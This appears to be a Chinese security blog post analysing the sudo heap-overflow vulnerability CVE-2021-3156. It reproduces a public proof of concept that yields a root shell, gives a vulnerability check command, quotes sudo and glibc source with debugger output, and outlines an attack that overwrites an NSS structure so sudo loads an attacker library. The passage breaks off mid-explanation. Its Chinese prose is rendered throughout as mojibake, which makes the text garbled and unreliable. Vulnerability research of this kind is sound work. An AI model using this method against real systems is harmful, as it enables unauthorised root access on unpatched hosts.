> åŸæ–‡é“¾æ¥: https://www.anquanke.com//post/id/231408 


# CVE-2021-3156 sudo heap-based bufoverflow å¤ç°&amp;åˆ†æ


                                é˜…è¯»é‡ Â Â 
                                **176079**
                            
                        |
                        
                                                            è¯„è®º
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01ab4d56ce84454ef9.jpg)](https://p4.ssl.qhimg.com/t01ab4d56ce84454ef9.jpg)



`CVE-2021-3156`æ˜¯`sudo`çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œæœ¬åœ°ææƒã€‚åœ¨ç±»`uninx`ä¸­é`root`å¯ä»¥ä½¿ç”¨`sudo`æ¥ä»¥`root`çš„æƒé™æ‰§è¡Œæ“ä½œã€‚ç”±äº`sudo`é”™è¯¯çš„è½¬ä¹‰äº†`\`å¯¼è‡´äº†ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ã€‚

æ¼æ´å½±å“ç‰ˆæœ¬ä¸º`1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1`ï¼Œ`sudo &gt;=1.9.5sp2`çš„ç‰ˆæœ¬åˆ™ä¸å—å½±å“ã€‚

æ„Ÿè°¢`luc`å¸ˆå‚…å¸¦æˆ‘é£ã€‚



## ç¯å¢ƒæ­å»º

è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯`docker ubuntu 20.04`ï¼ŒæŸ¥çœ‹ä¸€ä¸‹`sudo`ç‰ˆæœ¬ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªæ™®é€šæƒé™çš„ç”¨æˆ·

```
normal@c957df720fc7:/root/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

æ‰§è¡Œå‘½ä»¤`sudoedit -s /`å¦‚æœå›æ˜¾

```
root@c957df720fc7:~/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty# sudoedit -s /
sudoedit: /: not a regular file
```

åˆ™è¡¨æ˜å­˜åœ¨æ¼æ´ï¼Œå¦‚æœå›æ˜¾

```
âœ  work sudoedit -s /
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
```

åˆ™è¡¨ç¤ºæ¼æ´å·²ç»è¢«ä¿®å¤



## æ¼æ´åˆ†æ

é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨[exp](https://github.com/blasty/CVE-2021-3156)å…ˆæ‰§è¡Œä¸€ä¸‹

```
root@c957df720fc7:~/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty# su normal
normal@c957df720fc7:/root/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty$ ls
Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich
normal@c957df720fc7:/root/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty$ make
rm -rf libnss_X
mkdir libnss_X
gcc -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
normal@c957df720fc7:/root/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;

using target: 'Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31'
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1000(normal)
# exit
normal@c957df720fc7:/root/pwn/æ¼æ´/CVE-2021-3156/CVE-2021-3156_blasty$
```

å½“`sudo`ä»¥`-i,-s`å‚æ•°å¯åŠ¨å³`MODE_SHELL,MODE_LOGIN_SHELl`æ ‡å¿—å¯åŠ¨çš„æ—¶å€™ï¼Œ`sudo`ä¼šä½¿ç”¨`\`è½¬ä¹‰æ‰€æœ‰çš„å…ƒå­—ç¬¦ï¼Œå¹¶é‡å†™`argc,argv`

```
//src/parse_args.c/parse_args
if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) `{`
  char **av, *cmnd = NULL;
  int ac = 1;

  if (argc != 0) `{`
    /* shell -c "command" */
    char *src, *dst;
    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
      strlen(argv[argc - 1]) + 1;

    cmnd = dst = reallocarray(NULL, cmnd_size, 2);
    if (cmnd == NULL)
      sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
    if (!gc_add(GC_PTR, cmnd))
      exit(1);

    for (av = argv; *av != NULL; av++) `{`// ä¸²è”æ‰€æœ‰çš„å‘½ä»¤å‚æ•°å­—ç¬¦ä¸²
      for (src = *av; *src != '\0'; src++) `{`
        /* quote potential meta characters */
        // ç”¨\è½¬ä¹‰æ‰€æœ‰çš„å…ƒå­—ç¬¦
        if (!isalnum((unsigned char)*src) &amp;&amp; *src != '_' &amp;&amp; *src != '-' &amp;&amp; *src != '$')
          *dst++ = '\\';
        *dst++ = *src;
      `}`
      *dst++ = ' ';
    `}`
    if (cmnd != dst)
      dst--;  /* replace last space with a NUL */
    *dst = '\0';

    ac += 2; /* -c cmnd */
  `}`

  // é‡å†™argcï¼Œargv
  av = reallocarray(NULL, ac + 1, sizeof(char *));
  if (av == NULL)
    sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
  if (!gc_add(GC_PTR, av))
    exit(1);

  av[0] = (char *)user_details.shell; /* plugin may override shell */
  if (cmnd != NULL) `{`
    av[1] = "-c";
    av[2] = cmnd;
  `}`
  av[ac] = NULL;

  argv = av;
  argc = ac;
`}`
```

ä¹‹åä¼šåœ¨`sudoers_policy_main`å‡½æ•°ä¸­è°ƒç”¨`set_cmnd`å‡½æ•°

```
//plugins/sudoers/sudoers.c
int
  sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],
                      bool verbose, void *closure)
`{`
  //...
  /* Find command in path and apply per-command Defaults. */
  cmnd_status = set_cmnd();
  if (cmnd_status == NOT_FOUND_ERROR)
    goto done;
  //...
`}`

static int
  set_cmnd(void)
`{`
  //...
  if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) `{`

 847         if (NewArgc &gt; 1) `{`
 848             char *to, *from, **av;
 849             size_t size, n;
 850
 851             /* Alloc and build up user_args. */
 852             for (size = 0, av = NewArgv + 1; *av; av++)
 853                 size += strlen(*av) + 1;
 854             if (size == 0 || (user_args = malloc(size)) == NULL) `{`
 855                 sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
 856                 debug_return_int(-1);
 857             `}`
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) `{`
 859                 /*
 860                  * When running a command via a shell, the sudo front-end
 861                  * escapes potential meta chars.  We unescape non-spaces
 862                  * for sudoers matching and logging purposes.
 863                  */
 864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) `{`
 865                     while (*from) `{`
 866                         if (from[0] == '\\' &amp;&amp; !isspace((unsigned char)from[1]))
 867                             from++;
 868                         *to++ = *from++;
 869                     `}`
 870                     *to++ = ' ';
 871                 `}`
 872                 *--to = '\0';
 873             `}` else `{`
 874                 //...
 885         `}`
 886     `}`
  `}`
//...
`}`
```

ä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå‡½æ•°é¦–å…ˆæŒ‰ç…§`argv`ä¸­å‚æ•°çš„å¤§å°ç”³è¯·ä¸€å—å †ç©ºé—´`user_args`ï¼Œç„¶åä¾æ¬¡å°†å‘½ä»¤è¡Œå‚æ•°é“¾æ¥åˆ°è¯¥å †ç©ºé—´ä¸­ã€‚

ä½†æ˜¯å¦‚æœå½“ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ä»¥åæ–œæ ç»“å°¾ï¼Œå³`from[0]=\,from[1]=null`ï¼Œå°±ä¼šæ»¡è¶³`866`è¡Œçš„æ¡ä»¶ï¼Œä½¿å¾—`from++`æŒ‡å‘`null`ï¼Œä½†æ˜¯ä¹‹å`868`è¡Œæ‰§è¡Œçš„æ‹·è´æ“ä½œåˆä¼šä½¿å¾—`from++`ä»è€Œè¶Šè¿‡äº†`null`ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„`while`å¾ªç¯å°±ä¼šå‘ç”Ÿè¶Šç•Œæ‹·è´ã€‚æ‹·è´çš„å†…å®¹å°†ä¼šå¤åˆ¶åˆ°`user_args`å †å—ä¸­ï¼Œä»è€Œå‘ç”Ÿå †æº¢å‡ºã€‚

ä½†æ˜¯ç†è®ºåœ¨è®¾ç½®äº†`MODE_SHELL,MODE_LOGIN_SHELL`çš„æ¡ä»¶ä¸‹ä»»ä½•å‘½ä»¤è¡Œå‚æ•°éƒ½ä¸å¯èƒ½ä»¥`\`ç»“å°¾ï¼Œå› ä¸ºå…¶åœ¨`parse_args`å‡½æ•°ä¸­ä¼šå¯¹æ‰€æœ‰çš„å…ƒå­—ç¬¦è¿›è¡Œè½¬ä¹‰åŒ…æ‹¬è¿™ä¸ª`\`ã€‚

ä½†æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°ä¸­çš„åˆ¤æ–­æ¡ä»¶æœ‰æ‰€ä¸åŒ

```
//parse_args
if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL))`{``}`
//sudoers_policy_main
if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) `{`
  if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL))`{``}`
`}`
```

é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è¦æˆåŠŸçš„åˆ©ç”¨å †æº¢å‡ºå°±éœ€è¦åœ¨è®¾ç½®`flags=MODE_SHELL/MODE_LOGIN_SHELL`çš„æ¡ä»¶ä¸‹è€Œä¸è®¾ç½®`mode=MODE_RUN`ä»¥é¿å…è½¬ç§»ä»£ç çš„æ‰§è¡Œã€‚é‚£ä¹ˆæ ¹æ®`sudoers_policy_main`ä¸­çš„æ¡ä»¶ï¼Œæˆ‘ä»¬åªèƒ½è®¾ç½®`MODE_EDIT | MODE_CHECK`è¿™ä¸¤ä¸ªæ ‡å¿—ä½äº†ï¼Œæ¥çœ‹ä¸€ä¸‹è®¾ç½®çš„ä»£ç 

```
case 'e':
            if (mode &amp;&amp; mode != MODE_EDIT)
            usage_excl(1);
            mode = MODE_EDIT;
            sudo_settings[ARG_SUDOEDIT].value = "true";
            valid_flags = MODE_NONINTERACTIVE;
            break;
        case 'l':
            if (mode) `{`
            if (mode == MODE_LIST)
                SET(flags, MODE_LONG_LIST);
            else
                usage_excl(1);
            `}`
            mode = MODE_LIST;
            valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
            break;

    if (argc &gt; 0 &amp;&amp; mode == MODE_LIST)
    mode = MODE_CHECK;
```

ä½†æ˜¯å¦‚æœæˆ‘ä»¬è®¾ç½®äº†è¿™ä¸¤ä¸ªæ ‡å¿—ä½ï¼Œå¹¶ä¸”è®¾ç½®äº†`MODE_SHELL/MODE_LOGIN_SHELL`çš„è¯ï¼Œåœ¨åç»­ä¼šè¢«æ£€æµ‹åˆ°å¹¶é€€å‡º

```
if ((flags &amp; valid_flags) != flags)
  usage(1);// Give usage message and exit.
```

ä½†æ˜¯å½“æˆ‘ä»¬ä»¥`sudoedit`æ‰§è¡Œçš„æ—¶å€™

```
if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, "edit") == 0) `{`
  progname = "sudoedit";
  mode = MODE_EDIT;
  sudo_settings[ARG_SUDOEDIT].value = "true";
`}`
```

è¿™é‡Œåªä¼šè®¾ç½®`mode = MODE_EDIT`ï¼Œè€Œå¹¶ä¸ä¼šè®¾ç½®`valid_flags`ï¼Œä¹Ÿå°±ä¸ä¼šæ£€æµ‹é€€å‡ºï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œåˆ°å †æº¢å‡ºçš„éƒ¨åˆ†ã€‚

è¿™ä¸ªæ¼æ´æ˜¯éå¸¸å‹å¥½çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶å‘½ä»¤è¡Œå‚æ•°ä»è€Œæ§åˆ¶`user_args`å †å—ç”³è¯·çš„å¤§å°ï¼Œæº¢å‡ºçš„å†…å®¹ä»¥åŠæº¢å‡ºçš„é•¿åº¦ã€‚å¹¶ä¸”æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥åæ–œæ ç»“å°¾çš„æ–¹å¼å®ç°å‘ç›®æ ‡åœ°å€å†™`0`ã€‚



## æ¼æ´åˆ©ç”¨

### <a class="reference-link" name="%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"></a>èƒŒæ™¯çŸ¥è¯†

è¿™åœ¨è¿›è¡Œåˆ†æä¹‹å‰æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹`locale`å’Œ`nss`ç›¸å…³çš„ä¿¡æ¯ã€‚

`locale`æ˜¯æ ¹æ®è®¡ç®—æœºç”¨æˆ·æ‰€ä½¿ç”¨çš„è¯­è¨€ï¼Œæ‰€åœ¨çš„å›½å®¶å’Œåœ°åŒºæ‰€å®šä¹‰çš„ä¸€ä¸ªè½¯ä»¶è¿è¡Œæ—¶çš„è¯­è¨€ç¯å¢ƒï¼Œé€šå¸¸é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œè®¾ç½®ï¼Œ`locale`ç›¸å…³çš„ç¯å¢ƒå˜é‡ç”Ÿæ•ˆçš„é¡ºåºå¦‚ä¸‹
<li>
`LANGUAGE`æŒ‡å®šä¸ªäººå¯¹è¯­è¨€ç¯å¢ƒçš„ä¸»æ¬¡åå¥½ï¼Œå¦‚`zh_CN:en_US`
</li>
<li>
`LC_ALL`æ˜¯ä¸€ä¸ªå¯ä»¥è¢«`setlocale`è®¾ç½®çš„å®ï¼Œå…¶å€¼å¯ä»¥è¦†ç›–æ‰€æœ‰å…¶ä»–çš„`locale`è®¾å®š</li>
<li>
`LC_XXX`è¯¦ç»†è®¾å®š`locale`çš„å„ä¸ªæ–¹é¢ï¼Œå¯ä»¥è¦†ç›–`LANG`çš„å€¼</li>
<li>
`LANG`æŒ‡å®šé»˜è®¤ä½¿ç”¨çš„`locale`
</li>
å½“`LC_ALL/LANG`è¢«è®¾ç½®ä¸º`C`çš„æ—¶å€™ï¼Œ`LANGUAGE`çš„å€¼å°†ä¼šè¢«å¿½ç•¥ã€‚å…¶å‘½åè§„åˆ™å¦‚ä¸‹

```
language[_territory[.codeset]][@modifier]
```

å…¶ä¸­`language`æ˜¯[ISO 639-1](https://zh.wikipedia.org/wiki/ISO_639-1)æ ‡å‡†ä¸­å®šä¹‰çš„åŒå­—æ¯çš„è¯­è¨€ä»£ç ï¼Œ`territory`æ˜¯[ISO 3166-1](https://zh.wikipedia.org/wiki/ISO_3166-1)æ ‡å‡†ä¸­å®šä¹‰çš„åŒå­—æ¯çš„å›½å®¶å’Œåœ°åŒºä»£ç ï¼Œ`codeset`æ˜¯å­—ç¬¦é›†çš„åç§° (å¦‚ UTF-8ç­‰)ï¼Œè€Œ `modifier` åˆ™æ˜¯æŸäº›`locale`å˜ä½“çš„ä¿®æ­£ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥è¯¦ç»†çš„è®¾ç½®å…±`12`ä¸ªç¯å¢ƒå˜é‡

```
pwndbg&gt; p _nl_category_names
$1 = `{`
  str41 = "LC_COLLATE",
  str67 = "LC_CTYPE",
  str140 = "LC_MONETARY",
  str193 = "LC_NUMERIC",
  str207 = "LC_TIME",
  str259 = "LC_MESSAGES",
  str270 = "LC_PAPER",
  str279 = "LC_NAME",
  str292 = "LC_ADDRESS",
  str311 = "LC_TELEPHONE",
  str322 = "LC_MEASUREMENT",
  str330 = "LC_IDENTIFICATION"
`}`
```

`nss`å…¨ç§°ä¸º`Name Service Switch`ï¼Œåœ¨`*nix`æ“ä½œç³»ç»Ÿä¸­ï¼Œ`nss`æ˜¯`C`è¯­è¨€åº“çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ¥è§£æ`name`ï¼Œæ¯”å¦‚ç™»é™†ç”¨æˆ·çš„ç”¨æˆ·åä»¥åŠ`IP`åœ°å€åˆ°åŸŸåçš„è§£æã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå½“æˆ‘ä»¬è¾“å…¥å‘½ä»¤`ls -alg`å³æŸ¥çœ‹ä¸€ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¯¹äºæ¯ä¸€ä¸ªæ–‡ä»¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œä½†æ˜¯å®é™…ä¸Šç³»ç»Ÿä¸­åªä¿å­˜äº†ç”¨æˆ·å’Œç”¨æˆ·ç»„çš„`id`ï¼Œè¦æƒ³æ˜¾ç¤ºä¸ä¹‹ç›¸å…³çš„å­—ç¬¦è¿™å°±éœ€è¦`nss`è¿›è¡Œè§£æã€‚æˆ‘ä»¬å¯ä»¥åœ¨é…ç½®æ–‡ä»¶`/etc/nsswitch.conf`ä¸­å®šä¹‰ç›¸å…³æ•°æ®åº“çš„æŸ¥æ‰¾è§„èŒƒ

```
root@2c3723801aeb:/home/normal/CVE-2021-3156_blasty# cat /etc/nsswitch.conf
# /etc/nsswitch.conf
#
# Example configuration of GNU Name Service Switch functionality.
# If you have the `glibc-doc-reference' and `info' packages installed, try:
# `info libc "Name Service Switch"' for information about this file.

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files dns
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
```

å¯¹äºæ¯ä¸ªå¯ç”¨çš„æŸ¥æ‰¾è§„èŒƒå³`service`éƒ½å¿…é¡»æœ‰æ–‡ä»¶`libnss_service.so.2`ä¸ä¹‹å¯¹åº”ï¼Œä¾‹å¦‚`group`æ•°æ®åº“å®šä¹‰äº†æŸ¥æ‰¾è§„èŒƒ`files`ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨`getgroup`å‡½æ•°çš„æ—¶å€™å°±ä¼šè°ƒç”¨`libnss_files.so.2`ä¸­çš„`nss_lookup_function`å‡½æ•°è¿›è¡ŒæŸ¥æ‰¾ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨`ubuntu`ä¸­æ‰¾åˆ°ä¸‹é¢çš„å…±äº«åº“

```
libnss_compat-2.31.so
libnss_compat.so
libnss_compat.so.2
libnss_dns-2.31.so
libnss_dns.so
libnss_dns.so.2
libnss_files-2.31.so
libnss_files.so
libnss_files.so.2
libnss_hesiod-2.31.so
libnss_hesiod.so
libnss_hesiod.so.2
libnss_nis-2.31.so
libnss_nis.so
libnss_nis.so.2
libnss_nisplus-2.31.so
libnss_nisplus.so
libnss_nisplus.so.2
libnss_systemd.so.2
```

æ­£å¸¸æƒ…å†µä¸‹å½“`sudo`è°ƒç”¨åˆ°`__nss_lookup_function`æƒ…å†µå¦‚ä¸‹

```
In file: /root/glibc/sourceCode/glibc-2.31/nss/nsswitch.c
   408 #endif
   409
   410
   411 void *
   412 __nss_lookup_function (service_user *ni, const char *fct_name)
 â–º 413 `{`
   414   void **found, *result;
   415
   416   /* We now modify global data.  Protect it.  */
   417   __libc_lock_lock (lock);
   418
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK]â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp  0x7fffffffe358 â€”â–¸ 0x7ffff7e3713f (internal_getgrouplist+175) â—‚â€” test   rax, rax
01:0008â”‚      0x7fffffffe360 â—‚â€” 0x25b000000ae
02:0010â”‚      0x7fffffffe368 â—‚â€” 0xffffff0000007d /* '`}`' */
03:0018â”‚      0x7fffffffe370 â—‚â€” 0xffffffffffffffff
04:0020â”‚      0x7fffffffe378 â€”â–¸ 0x7fffffffe380 â—‚â€” 0x1
05:0028â”‚      0x7fffffffe380 â—‚â€” 0x1
06:0030â”‚      0x7fffffffe388 â—‚â€” 0xc4e5bb2d41c2d00
07:0038â”‚      0x7fffffffe390 â—‚â€” 0x0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0     7ffff7e9bdf0 __nss_lookup_function
   f 1     7ffff7e3713f internal_getgrouplist+175
   f 2     7ffff7e373ed getgrouplist+109
   f 3     7ffff7f4fe16 sudo_getgrouplist2_v1+198
   f 4     7ffff7c53d63 sudo_make_gidlist_item+451
   f 5     7ffff7c52b0e sudo_get_gidlist+286
   f 6     7ffff7c4c86d runas_getgroups+93
   f 7     7ffff7c39d32 set_perms+1650
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg&gt; p *ni
$1 = `{`
  next = 0x55555557fc10,
  actions = `{`NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN`}`,
  library = 0x0,
  known = 0x0,
  name = 0x55555557fc00 "files"
`}`
pwndbg&gt; p *(ni-&gt;next)
$2 = `{`
  next = 0x0,
  actions = `{`NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN`}`,
  library = 0x0,
  known = 0x0,
  name = 0x55555557fc40 "systemd"
`}`
pwndbg&gt;
```

å½“è°ƒç”¨`getgroup`å‡½æ•°çš„æ—¶å€™ï¼Œ`__nss_lookup_function`ä¼šä¾æ¬¡åŠ è½½`files,systemd`è¿™ä¸¤ä¸ª`service name`ã€‚è€Œè¿™ä¸¤ä¸ª`service name`çš„ä¿¡æ¯æ˜¯å­˜å‚¨åœ¨å †ç©ºé—´ä¸­çš„ã€‚çœ‹ä¸€ä¸‹`__nss_lookup_function`å‡½æ•°çš„å…·ä½“å®ç°

```
void *
__nss_lookup_function (service_user *ni, const char *fct_name)
`{`
  void **found, *result;

  /* We now modify global data.  Protect it.  */
  __libc_lock_lock (lock);

  /* Search the tree of functions previously requested.  Data in the
     tree are `known_function' structures, whose first member is a
     `const char *', the lookup key.  The search returns a pointer to
     the tree node structure; the first member of the is a pointer to
     our structure (i.e. what will be a `known_function'); since the
     first member of that is the lookup key string, &amp;FCT_NAME is close
     enough to a pointer to our structure to use as a lookup key that
     will be passed to `known_compare' (above).  */

  found = __tsearch (&amp;fct_name, &amp;ni-&gt;known, &amp;known_compare);
  if (found == NULL)
    /* This means out-of-memory.  */
    result = NULL;
  else if (*found != &amp;fct_name)
    `{`
      //...
    `}`
  else
    `{`
      /* This name was not known before.  Now we have a node in the tree
     (in the proper sorted position for FCT_NAME) that points to
     &amp;FCT_NAME instead of any real `known_function' structure.
     Allocate a new structure and fill it in.  */

      known_function *known = malloc (sizeof *known);
      if (! known)
    `{`
//...
    `}`
      else
    `{`
      /* Point the tree node at this new structure.  */
      *found = known;
      known-&gt;fct_name = fct_name;

#if !defined DO_STATIC_NSS || defined SHARED
      /* Load the appropriate library.  */
      if (nss_load_library (ni) != 0)
        /* This only happens when out of memory.  */
        goto remove_from_tree;

      //...

  return result;
`}`
libc_hidden_def (__nss_lookup_function)
```

åœ¨è°ƒç”¨`nss_lookup_function`çš„æ—¶å€™ä¸€èˆ¬`fct_name`æ˜¯å›ºå®šçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥è¿›å…¥`nss_load_library`å‡½æ•°

```
static int
nss_load_library (service_user *ni)
`{`
  if (ni-&gt;library == NULL)
    `{`
      /* This service has not yet been used.  Fetch the service
     library for it, creating a new one if need be.  If there
     is no service table from the file, this static variable
     holds the head of the service_library list made from the
     default configuration.  */
      static name_database default_table;
      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,
                     ni-&gt;name);
      if (ni-&gt;library == NULL)
    return -1;
    `}`

  if (ni-&gt;library-&gt;lib_handle == NULL)
    `{`
      /* Load the shared library.  */
      size_t shlen = (7 + strlen (ni-&gt;name) + 3
              + strlen (__nss_shlib_revision) + 1);
      int saved_errno = errno;
      char shlib_name[shlen];

      /* Construct shared object name.  */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
                          "libnss_"),
                    ni-&gt;name),
              ".so"),
        __nss_shlib_revision);

      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);
      if (ni-&gt;library-&gt;lib_handle == NULL)
    `{`
      //...
    `}`
# ifdef USE_NSCD
      else if (is_nscd)
    `{`
        //...
      `}`

  return 0;
`}`
#endif

static service_library *
nss_new_service (name_database *database, const char *name)
`{`
  service_library **currentp = &amp;database-&gt;library;

  while (*currentp != NULL)
    `{`
      if (strcmp ((*currentp)-&gt;name, name) == 0)
    return *currentp;
      currentp = &amp;(*currentp)-&gt;next;
    `}`

  /* We have to add the new service.  */
  *currentp = (service_library *) malloc (sizeof (service_library));
  if (*currentp == NULL)
    return NULL;

  (*currentp)-&gt;name = name;
  (*currentp)-&gt;lib_handle = NULL;
  (*currentp)-&gt;next = NULL;

  return *currentp;
`}`
#endif
```

ä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœ`ni-&gt;library=NULL`ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨`nss_new_service`å‡½æ•°ä¸ºå…¶åˆ†é…ä¸€ä¸ªå †å—ï¼Œå¹¶å¯¹`name,lib_handle,next`èµ‹å€¼ï¼Œå®Œæˆä¹‹åè¿›å…¥`if (ni-&gt;library-&gt;lib_handle == NULL)`åˆ†æ”¯ï¼Œå¯¹`name`è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯`libnss_+name+'.so.2'`ï¼Œä¹‹åå°±ä¼šè°ƒç”¨`__libc_dlopen`å‡½æ•°åŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚

ç”±äº`ni`çš„`service name`ç»“æ„ä½“æ˜¯åˆ†é…åœ¨å †ç©ºé—´ä¸­çš„ï¼Œè€Œç°åœ¨æˆ‘ä»¬æœ‰å­˜åœ¨`user_args`çš„å †æº¢å‡ºçš„æ¼æ´ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºå°†`service name`ç»“æ„ä½“çš„é™¤`name`ä¹‹å¤–çš„å…¶ä»–æˆå‘˜å˜é‡å…¨éƒ¨è¦†å†™ä¸º`0`ï¼Œ`name`è¦†å†™ä¸º`x/x`é‚£ä¹ˆç»è¿‡å­—ç¬¦ä¸²æ‹¼æ¥ä¹‹åå°±ä¼šåŠ è½½`libnss_x/x.so.2`çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæˆ‘ä»¬å°†`getshell`çš„ä»£ç å†™å…¥`_init`ä¹‹åç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“å³å¯ã€‚

æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•æº¢å‡ºçš„é—®é¢˜ã€‚ä¸ºäº†é˜²æ­¢æº¢å‡ºè¿‡ç¨‹ä¸­è¦†å†™ä¸­é—´çš„å…³é”®ç»“æ„ä½“ï¼Œ`user_args`ä¸`service name`ä¹‹é—´çš„è·ç¦»è¦å°½å¯èƒ½çš„å°ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯åœ¨`service name`ä¸Šæ–¹äººä¸ºçš„é‡Šæ”¾ä¸€ä¸ªå †å—ï¼Œä¹‹å`user_args`å†ç”³è¯·è¯¥å †å—è¿›è¡Œæº¢å‡ºã€‚ç›®å‰åˆ†æçš„`exp`æ˜¯é€šè¿‡`setlocale`å®ç°çš„ã€‚æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹`service_user`çš„åˆå§‹åŒ–è¿‡ç¨‹

